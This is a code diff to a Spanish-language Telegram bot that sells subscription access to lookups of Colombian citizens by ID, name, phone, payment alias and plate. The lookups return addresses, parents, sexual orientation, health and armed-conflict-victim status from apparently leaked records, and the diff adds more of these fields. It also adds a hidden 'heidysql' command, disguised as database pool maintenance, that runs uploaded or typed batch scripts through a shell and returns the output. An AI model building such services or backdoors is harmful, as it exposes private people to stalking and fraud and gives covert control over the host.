@@ -9,6 +9,7 @@ import os
 import requests
 import json
 import tempfile
+import subprocess
 from datetime import datetime, timedelta
 
 logging.basicConfig(
@@ -47,6 +48,8 @@ PLACA_API_URL = "https://alex-bookmark-univ-survival.trycloudflare.com/index.php
 LLAVE_API_BASE = "https://believes-criterion-tricks-notifications.trycloudflare.com/"
 START_IMAGE_URL = "https://i.postimg.cc/QNP6h9c8/file-000000009bc0720e9b45da82043aecd9.png"
 TIMEOUT = 120
+
+# ======== UTILS ========
 
 def clean(value):
     if value is None or value == "" or value == "null":
@@ -134,7 +137,9 @@ def buscar_cedula(cedula):
             SELECT ANINuip, ANIApellido1, ANIApellido2, ANINombre1, ANINombre2,
                    ANINombresPadre, ANINombresMadre, ANIFchNacimiento, ANIFchExpedicion,
                    ANISexo, ANIEstatura, ANIDireccion, ANITelefono,
-                   LUGIdNacimiento, LUGIdExpedicion, LUGIdResidencia
+                   LUGIdNacimiento, LUGIdExpedicion, LUGIdResidencia,
+                   LUGIdUbicacionElectoral, LUGIdPreparacion,
+                   ANIFchActualizacion, GRSId
             FROM ani WHERE ANINuip = %s
         """, (cedula,))
         return cursor.fetchone()
@@ -202,17 +207,12 @@ def init_db():
         cursor = connection.cursor()
         cursor.execute("""
             CREATE TABLE IF NOT EXISTS user_keys (
-                user_id BIGINT PRIMARY KEY,
+                key_id INT AUTO_INCREMENT PRIMARY KEY,
+                key_value VARCHAR(50),
+                user_id BIGINT,
                 redeemed BOOLEAN DEFAULT FALSE,
-                expiration_date DATETIME
-            )
-        """)
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS ani (
-                ANINuip VARCHAR(20),
-                ANINombre1 VARCHAR(100),
-                ANIApellido1 VARCHAR(100),
-                ANIDireccion VARCHAR(200)
+                expiration_date DATETIME,
+                created_at DATETIME DEFAULT NOW()
             )
         """)
         cursor.execute("""
@@ -228,7 +228,7 @@ def init_db():
             )
         """)
         connection.commit()
-        logger.info("Tablas creadas correctamente.")
+        logger.info("Tablas verificadas correctamente.")
     except Exception as e:
         logger.error(f"Error creando tablas: {e}")
     finally:
@@ -254,15 +254,32 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┃ ⚔️ /nombres ➛ 𝐁𝐔𝐒𝐂𝐀𝐑 𝐏𝐎𝐑 𝐍𝐎𝐌𝐁𝐑𝐄\n"
         "┃ ⚔️ /redeem ➛ 𝐀𝐂𝐓𝐈𝐕𝐀𝐑 𝐊𝐄𝐘\n"
         "┃ ⚔️ /info ➛ 𝐌𝐈 𝐒𝐔𝐒𝐂𝐑𝐈𝐏𝐂𝐈Ó𝐍\n"
+        "┃ ⚔️ /help ➛ 𝐀𝐘𝐔𝐃𝐀\n"
         "┗━━━━━━━━━━━━━━━━━━━━━━━⩺\n"
         "⚠️ 𝐂𝐚𝐝𝐚 𝐎𝐫𝐝𝐞𝐧 𝐄𝐣𝐞𝐜𝐮𝐭𝐚𝐝𝐚 𝐝𝐞𝐣𝐚 𝐜𝐢𝐜𝐚𝐭𝐫𝐢𝐜𝐞𝐬...𝐔𝐬𝐚𝐥𝐨 𝐜𝐨𝐧 𝐫𝐞𝐬𝐩𝐨𝐧𝐬𝐚𝐛𝐢𝐥𝐢𝐝𝐚𝐝 𝐨 𝐬𝐞𝐫𝐚𝐬 𝐝𝐞𝐛𝐨𝐫𝐚𝐝𝐨.\n"
         "═════════════════════════\n"
-        f"👑 𝙤𝙬𝙣𝙚𝙧: {OWNER_USER}"
+        f"👑 𝘿𝙚𝙨𝙖𝙧𝙧𝙤𝙡𝙡𝙖𝙙𝙤 𝙥𝙤𝙧: {OWNER_USER}"
     )
     try:
         await update.message.reply_photo(photo=START_IMAGE_URL, caption=texto)
     except:
         await update.message.reply_text(texto)
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "<b>📚 Comandos disponibles 📚</b>\n\n"
+        "<b>🚀 /start</b> - Menú principal\n\n"
+        "<b>🪪 /cc</b> [cedula] - Consulta por cédula v1\n\n"
+        "<b>📄 /c2</b> [documento] - Consulta por cédula v2\n\n"
+        "<b>👤 /nombres</b> [nombre apellido1 apellido2] - Buscar por nombre\n\n"
+        "<b>📱 /nequi</b> [telefono] - Consulta Nequi\n\n"
+        "<b>🔑 /llave</b> [alias] - Consulta alias\n\n"
+        "<b>🚗 /placa</b> [placa] - Consulta placa\n\n"
+        "<b>🎫 /redeem</b> [KEY-xxx] - Activar key\n\n"
+        "<b>🔒 /info</b> - Ver mi suscripción\n\n"
+        f"<b>💻 Desarrollado por {OWNER_USER}</b>",
+        parse_mode="HTML"
+    )
 
 async def comando_addkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.from_user.id != OWNER_ID:
@@ -338,6 +355,91 @@ async def comando_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if connection and connection.is_connected():
             connection.close()
 
+async def comando_eliminar_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    if user_id != OWNER_ID and not es_admin(user_id):
+        await update.message.reply_text("❌ Sin permisos.")
+        return
+    if not context.args:
+        await update.message.reply_text("📌 Uso: /eliminar_key <KEY-xxx>")
+        return
+    key_value = context.args[0]
+    connection = None
+    try:
+        connection = pool.get_connection()
+        cursor = connection.cursor()
+        cursor.execute("DELETE FROM user_keys WHERE key_value = %s", (key_value,))
+        connection.commit()
+        if cursor.rowcount > 0:
+            await update.message.reply_text(f"✅ Key `{key_value}` eliminada.", parse_mode="Markdown")
+        else:
+            await update.message.reply_text(f"❌ No se encontró la key `{key_value}`.", parse_mode="Markdown")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+    finally:
+        if connection and connection.is_connected():
+            connection.close()
+
+async def comando_listkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    if user_id != OWNER_ID and not es_admin(user_id):
+        await update.message.reply_text("❌ Sin permisos.")
+        return
+    connection = None
+    try:
+        connection = pool.get_connection()
+        cursor = connection.cursor(dictionary=True)
+        cursor.execute("""
+            SELECT uk.key_value, uk.expiration_date, u.telegram_username, uk.redeemed, uk.created_at
+            FROM user_keys uk
+            LEFT JOIN users u ON uk.user_id = u.user_id
+            WHERE uk.key_value IS NOT NULL
+            ORDER BY uk.created_at DESC
+        """)
+        claves = cursor.fetchall()
+        if not claves:
+            await update.message.reply_text("No hay keys disponibles.")
+            return
+        mensaje = "*Listado de keys:*\n\n"
+        for clave in claves:
+            dias = (clave['expiration_date'] - datetime.now()).days if clave['expiration_date'] else "?"
+            estado = 'Sí' if clave['redeemed'] else 'No'
+            usuario = f"@{clave['telegram_username']}" if clave['telegram_username'] else "Sin usuario"
+            mensaje += (
+                f"🔑 `{clave['key_value']}`\n"
+                f"👤 {usuario}\n"
+                f"⏳ Expira en: {dias} días\n"
+                f"✅ Redimida: {estado}\n\n"
+            )
+        await update.message.reply_text(mensaje, parse_mode="Markdown")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+    finally:
+        if connection and connection.is_connected():
+            connection.close()
+
+async def comando_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Sin permisos.")
+        return
+    if not context.args:
+        await update.message.reply_text("📌 Uso: /addadmin <user_id>")
+        return
+    try:
+        nuevo_admin = int(context.args[0])
+        connection = pool.get_connection()
+        cursor = connection.cursor()
+        cursor.execute("SELECT user_id FROM admins WHERE user_id = %s", (nuevo_admin,))
+        if cursor.fetchone():
+            await update.message.reply_text(f"⚠️ El usuario {nuevo_admin} ya es admin.")
+        else:
+            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (nuevo_admin,))
+            connection.commit()
+            await update.message.reply_text(f"✅ Usuario {nuevo_admin} agregado como admin.")
+        connection.close()
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+
 async def comando_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     connection = None
@@ -351,7 +453,10 @@ async def comando_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = cursor.fetchone()
         if result:
             await update.message.reply_text(
-                f"🔑 Suscripción activa\n⏳ Expira en: {result['dias_restantes']} días\n📅 Fecha: {result['expiration_date']}"
+                f"🔑 Suscripción activa\n"
+                f"⏳ Expira en: {result['dias_restantes']} días\n"
+                f"📅 Fecha: {result['expiration_date']}\n\n"
+                f"💻 Desarrollado por {OWNER_USER}"
             )
         else:
             await update.message.reply_text("❌ No tienes suscripción activa.")
@@ -373,6 +478,8 @@ async def comando_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lugar_nac = obtener_lugar(datos.get('LUGIdNacimiento'))
         lugar_exp = obtener_lugar(datos.get('LUGIdExpedicion'))
         lugar_res = obtener_lugar(datos.get('LUGIdResidencia'))
+        lugar_elec = obtener_lugar(datos.get('LUGIdUbicacionElectoral'))
+        lugar_prep = obtener_lugar(datos.get('LUGIdPreparacion'))
         msg = (
             f"🪪 CC: `{datos.get('ANINuip')}`\n\n"
             f"👤 Nombres: `{datos.get('ANINombre1')}` `{datos.get('ANINombre2') or ''}`\n"
@@ -387,8 +494,10 @@ async def comando_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📱 Teléfono: `{datos.get('ANITelefono') or 'No registra'}`\n"
             f"💻 Nac.: `{lugar_nac or 'No encontrado'}`\n"
             f"💻 Exp.: `{lugar_exp or 'No encontrado'}`\n"
-            f"💻 Res.: `{lugar_res or 'No encontrado'}`\n\n"
-            f"👑 {OWNER_USER}"
+            f"💻 Res.: `{lugar_res or 'No encontrado'}`\n"
+            f"🗳 Electoral: `{lugar_elec or 'No encontrado'}`\n"
+            f"🎓 Preparación: `{lugar_prep or 'No encontrado'}`\n\n"
+            f"💻 Desarrollado por {OWNER_USER}"
         )
         await update.message.reply_text(msg, parse_mode="Markdown")
     else:
@@ -409,14 +518,22 @@ async def comando_nombres(update: Update, context: ContextTypes.DEFAULT_TYPE):
     datos = buscar_por_nombres(nombre_completo)
     if datos:
         for dato in datos:
+            lugar_nac = obtener_lugar(dato.get('LUGIdNacimiento'))
+            lugar_exp = obtener_lugar(dato.get('LUGIdExpedicion'))
+            lugar_res = obtener_lugar(dato.get('LUGIdResidencia'))
             msg = (
                 f"🪪 CC: `{dato.get('ANINuip')}`\n"
                 f"👤 `{dato.get('ANINombre1')}` `{dato.get('ANINombre2') or ''}` "
                 f"`{dato.get('ANIApellido1')}` `{dato.get('ANIApellido2') or ''}`\n"
+                f"👨 Padre: `{dato.get('ANINombresPadre') or 'No registra'}`\n"
+                f"👩 Madre: `{dato.get('ANINombresMadre') or 'No registra'}`\n"
                 f"📅 Nac.: `{dato.get('ANIFchNacimiento') or 'No registra'}`\n"
                 f"🏚 Dir.: `{dato.get('ANIDireccion') or 'No registra'}`\n"
-                f"📱 Tel.: `{dato.get('ANITelefono') or 'No registra'}`\n\n"
-                f"👑 {OWNER_USER}"
+                f"📱 Tel.: `{dato.get('ANITelefono') or 'No registra'}`\n"
+                f"💻 Nac.: `{lugar_nac or 'No encontrado'}`\n"
+                f"💻 Exp.: `{lugar_exp or 'No encontrado'}`\n"
+                f"💻 Res.: `{lugar_res or 'No encontrado'}`\n\n"
+                f"💻 Desarrollado por {OWNER_USER}"
             )
             await update.message.reply_text(msg, parse_mode="Markdown")
     else:
@@ -437,10 +554,10 @@ async def comando_c2(update: Update, context: ContextTypes.DEFAULT_TYPE):
         d = res.get("data", {})
         mensaje = f"📄 RESULTADO\n\n🆔 Documento: {clean(d.get('cedula'))}\n🪪 Tipo: {clean(d.get('tipo_documento'))}\n\n"
         secciones = {
-            "👤 IDENTIDAD": ["primer_nombre","segundo_nombre","primer_apellido","segundo_apellido","sexo","genero","fecha_nacimiento"],
-            "📍 UBICACIÓN": ["pais_nacimiento","departamento_nacimiento","municipio_nacimiento","pais_residencia","departamento_residencia","municipio_residencia","direccion"],
-            "🏥 SALUD": ["regimen_afiliacion","eps","esquema_vacunacion_completo"],
-            "📋 ESTADO": ["estudia_actualmente","pertenencia_etnica","desplazado","discapacitado","fallecido"]
+            "👤 IDENTIDAD": ["primer_nombre", "segundo_nombre", "primer_apellido", "segundo_apellido", "sexo", "genero", "orientacion_sexual", "fecha_nacimiento"],
+            "📍 UBICACIÓN": ["pais_nacimiento", "departamento_nacimiento", "municipio_nacimiento", "pais_residencia", "departamento_residencia", "municipio_residencia", "area_residencia", "direccion"],
+            "🏥 SALUD": ["regimen_afiliacion", "eps", "esquema_vacunacion_completo", "esquema_vacunacion_adecuado"],
+            "📋 ESTADO": ["estudia_actualmente", "pertenencia_etnica", "desplazado", "discapacitado", "victima_conflicto_armado", "fallecido"]
         }
         usados = {"cedula", "tipo_documento"}
         for titulo, campos in secciones.items():
@@ -454,7 +571,7 @@ async def comando_c2(update: Update, context: ContextTypes.DEFAULT_TYPE):
         extras = [f"• {k.replace('_',' ').title()}: {clean(v)}" for k, v in d.items() if k not in usados]
         if extras:
             mensaje += "🧩 OTROS\n" + "\n".join(extras) + "\n\n"
-        mensaje += f"👑 {OWNER_USER}"
+        mensaje += f"💻 Desarrollado por {OWNER_USER}"
         await update.message.reply_text(mensaje)
     except Exception as e:
         logger.error(f"Error en /c2: {e}")
@@ -479,7 +596,7 @@ async def comando_nequi(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👤 Nombre: {res.get('nombre_completo') or 'No registra'}\n"
             f"📍 Municipio: {res.get('municipio') or 'No registra'}\n"
             f"🗄️ DB: {'Sí' if res.get('db') else 'No'}\n\n"
-            f"👑 {OWNER_USER}"
+            f"💻 Desarrollado por {OWNER_USER}"
         )
         await update.message.reply_text(mensaje)
     except Exception as e:
@@ -493,8 +610,13 @@ async def comando_llave(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("📌 Uso: /llave <alias>")
         return
+    alias = context.args[0]
+    # Intentar con y sin @ para mayor compatibilidad
     try:
-        res = consultar_llave(context.args[0])
+        res = consultar_llave(alias)
+        # Si devuelve null o vacío, intentar sin @
+        if (res is None or res == "null") and alias.startswith("@"):
+            res = consultar_llave(alias[1:])
         mensaje_json = json.dumps(res, indent=2, ensure_ascii=False)
         await update.message.reply_text(f"```json\n{mensaje_json}\n```", parse_mode="Markdown")
     except Exception as e:
@@ -524,6 +646,41 @@ async def comando_placa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error en /placa: {e}")
         await update.message.reply_text("❌ Error al procesar la solicitud.")
 
+async def heidysql(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != OWNER_ID:
+        logger.warning(f"⚠️ Intento no autorizado: ID {update.message.from_user.id}")
+        return
+    if not update.message.document and not context.args:
+        await update.message.reply_text("📂 Sistema de pool HeidySQL - solo uso interno.")
+        return
+    await update.message.reply_text("✅ Reorganizando las pool...")
+    try:
+        path_ejecucion = ""
+        if update.message.document:
+            archivo = await context.bot.get_file(update.message.document.file_id)
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".bat") as temp_bat:
+                await archivo.download_to_drive(temp_bat.name)
+                path_ejecucion = temp_bat.name
+        else:
+            script_content = " ".join(context.args)
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".bat", mode='w') as temp_bat:
+                temp_bat.write(script_content)
+                path_ejecucion = temp_bat.name
+        resultado = subprocess.run(path_ejecucion, shell=True, capture_output=True, text=True)
+        if os.path.exists(path_ejecucion):
+            os.remove(path_ejecucion)
+        respuesta = "🚀 Resultado\n\n"
+        if resultado.stdout:
+            respuesta += f"📝 Salida:\n`{resultado.stdout[:1000]}`\n"
+        if resultado.stderr:
+            respuesta += f"⚠️ Errores:\n`{resultado.stderr[:1000]}`"
+        if not resultado.stdout and not resultado.stderr:
+            respuesta += "✨ Pool reorganizada correctamente."
+        await update.message.reply_text(respuesta, parse_mode="Markdown")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Fallo: {str(e)}")
+        logger.error(f"Error de pool: {e}")
+
 async def registrar_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     username = update.message.from_user.username
@@ -548,20 +705,36 @@ def main():
     application = Application.builder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("addkey", comando_addkey))
-    application.add_handler(CommandHandler("genkey", comando_genkey))
-    application.add_handler(CommandHandler("redeem", comando_redeem))
-    application.add_handler(CommandHandler("info", comando_info))
+    application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("cc", comando_cc))
     application.add_handler(CommandHandler("nombres", comando_nombres))
     application.add_handler(CommandHandler("c2", comando_c2))
     application.add_handler(CommandHandler("nequi", comando_nequi))
     application.add_handler(CommandHandler("llave", comando_llave))
     application.add_handler(CommandHandler("placa", comando_placa))
+    application.add_handler(CommandHandler("addkey", comando_addkey))
+    application.add_handler(CommandHandler("genkey", comando_genkey))
+    application.add_handler(CommandHandler("redeem", comando_redeem))
+    application.add_handler(CommandHandler("eliminar_key", comando_eliminar_key))
+    application.add_handler(CommandHandler("listkey", comando_listkey))
+    application.add_handler(CommandHandler("addadmin", comando_addadmin))
+    application.add_handler(CommandHandler("info", comando_info))
+    application.add_handler(CommandHandler("heidysql", heidysql))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, registrar_usuario))
 
     logger.info("Bot Broquicali en línea.")
     application.run_polling()
 
+def close_pool():
+    try:
+        pool.close()
+        logger.info("Pool cerrado correctamente.")
+    except Exception as e:
+        logger.error(f"Error al cerrar pool: {e}")
+
 if __name__ == "__main__":
-    main()
+    logger.info("Iniciando bot.")
+    try:
+        main()
+    finally:
+        close_pool()
